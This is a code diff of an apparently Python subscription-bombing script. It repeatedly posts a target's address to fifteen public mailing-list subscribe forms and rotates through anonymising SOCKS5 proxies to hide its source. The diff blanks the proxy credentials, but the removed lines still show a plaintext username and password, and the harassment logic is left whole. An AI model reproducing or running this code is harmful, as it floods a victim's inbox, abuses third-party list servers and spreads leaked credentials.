@@ -124,34 +124,34 @@ def yak():
             def spam():
                 
                 proxies1 = {
-                    "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080",
-                    "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080"
+                    "http": "socks5h://@sea.socks.ipvanish.com:1080",
+                    "https": "socks5h://@sea.socks.ipvanish.com:1080"
                 }
                 linklist = [f"http://lists.dailydrool.org/subscribe.cgi/dailydrool-dailydrool.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/accotinkbluff?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://mailman.real-time.com/mailman/subscribe/rte-ascend?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/mailman?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.freeradius.org/mailman/subscribe/freeradius-announce?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/news-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/tc76-l-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/delang-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.sakuracon.org/subscribe.cgi/liaisons-sakuracon.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bway.net/mailman/subscribe/sienastudio?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.openscenegraph.org/subscribe.cgi/osg-users-openscenegraph.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bethel.edu/mailman/subscribe/parli?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/901fc-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/members-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/hap-users-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit="]
                 linkx = random.randint(0, 14)
                 prox1es = random.randint(0, 3)
                 if prox1es == 1:
                     proxies23 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080"
+                        "http": "socks5h://@sea.socks.ipvanish.com:1080",
+                        "https": "socks5h://@sea.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies23)
                 elif prox1es == 2:
                     proxies24 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@chi.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@chi.socks.ipvanish.com:1080"
+                        "http": "socks5h://@chi.socks.ipvanish.com:1080",
+                        "https": "socks5h://@chi.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies24)
                 elif prox1es == 0:
                     proxies25 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@msy.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@msy.socks.ipvanish.com:1080"
+                        "http": "socks5h://@msy.socks.ipvanish.com:1080",
+                        "https": "socks5h://@msy.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies25)
                 else:
                     proxies26 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@iad.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@iad.socks.ipvanish.com:1080"
+                        "http": "socks5h://@iad.socks.ipvanish.com:1080",
+                        "https": "socks5h://@iad.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies=proxies26)
                     #with data_lock:
@@ -253,34 +253,34 @@ if os.path.isfile('./autologin.txt') == False:
         if "False" in response100:
             def spam():
                 proxies1 = {
-                    "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080",
-                    "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080"
+                    "http": "socks5h://@sea.socks.ipvanish.com:1080",
+                    "https": "socks5h://@sea.socks.ipvanish.com:1080"
                 }
                 linklist = [f"http://lists.dailydrool.org/subscribe.cgi/dailydrool-dailydrool.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/accotinkbluff?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://mailman.real-time.com/mailman/subscribe/rte-ascend?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.blu.org/mailman/subscribe/mailman?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.freeradius.org/mailman/subscribe/freeradius-announce?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/news-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/tc76-l-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/delang-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.sakuracon.org/subscribe.cgi/liaisons-sakuracon.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bway.net/mailman/subscribe/sienastudio?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.openscenegraph.org/subscribe.cgi/osg-users-openscenegraph.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.bethel.edu/mailman/subscribe/parli?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/901fc-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.conlang.org/subscribe.cgi/members-conlang.org?email-button=Subscribe&email={phonenumber}&mbbsubmit=", f"http://lists.onebuilding.org/subscribe.cgi/hap-users-onebuilding.org?email-button=Subscribe&email={phonenumber}&mbbsubmit="]
                 linkx = random.randint(0, 14)
                 prox1es = random.randint(0, 3)
                 if prox1es == 1:
                     proxies23 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@sea.socks.ipvanish.com:1080"
+                        "http": "socks5h://@sea.socks.ipvanish.com:1080",
+                        "https": "socks5h://@sea.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies23)
                 elif prox1es == 2:
                     proxies24 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@chi.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@chi.socks.ipvanish.com:1080"
+                        "http": "socks5h://@chi.socks.ipvanish.com:1080",
+                        "https": "socks5h://@chi.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies24)
                 elif prox1es == 0:
                     proxies25 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@msy.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@msy.socks.ipvanish.com:1080"
+                        "http": "socks5h://@msy.socks.ipvanish.com:1080",
+                        "https": "socks5h://@msy.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies = proxies25)
                 else:
                     proxies26 = {
-                        "http": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@iad.socks.ipvanish.com:1080",
-                        "https": "socks5h://sj6Y4DsK2H:bScEdWcKL7IF@iad.socks.ipvanish.com:1080"
+                        "http": "socks5h://@iad.socks.ipvanish.com:1080",
+                        "https": "socks5h://@iad.socks.ipvanish.com:1080"
                     } 
                     requests.post(linklist[linkx], proxies=proxies26)
                     print("aaaaaas")
